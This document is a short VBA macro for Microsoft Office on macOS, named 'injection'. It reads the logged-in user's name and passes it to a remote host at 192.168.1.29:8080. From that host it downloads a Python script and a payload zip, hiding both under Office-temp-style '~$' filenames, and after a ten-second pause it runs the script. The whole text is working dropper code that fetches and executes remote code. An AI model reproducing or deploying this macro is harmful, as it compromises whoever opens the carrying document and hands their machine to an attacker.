Sub injection()
Dim getName As String
Dim cmd As String
Dim path As String
getName = "set userName to short user name of (system info)" & vbNewLine & "return userName"
name = MacScript(getName)
path = "/Users/" & name & "/Library/~\$payload.zip"
Shell ("curl -L http://192.168.1.29:8080/" & name & " -o ~\$script.py")
Shell ("curl http://192.168.1.29:8080/update -o " & path)
Application.Wait (Now + TimeValue("00:00:10"))
Shell ("python ~\$script.py")
End Sub